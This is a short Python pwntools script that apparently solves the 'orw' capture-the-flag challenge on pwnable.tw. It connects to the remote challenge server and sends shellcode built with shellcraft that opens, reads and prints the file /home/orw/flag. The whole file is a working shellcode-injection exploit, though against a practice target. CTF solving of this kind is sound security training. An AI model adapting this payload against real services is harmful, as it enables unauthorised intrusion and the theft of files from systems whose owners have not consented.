from pwn import *
#context.log_level = "debug"

#HOST = "localhost"
HOST = "chall.pwnable.tw"
#PORT = 4444
PORT = 10001

s = remote(HOST, PORT)

elf = ELF("./orw")
#libc = ELF("./")
pause()

payload = asm(shellcraft.open("/home/orw/flag"))
payload += asm(shellcraft.read("eax", "esp", 0x100))
payload += asm(shellcraft.write(1, "esp", 0x100))

s.send(payload)

s.interactive()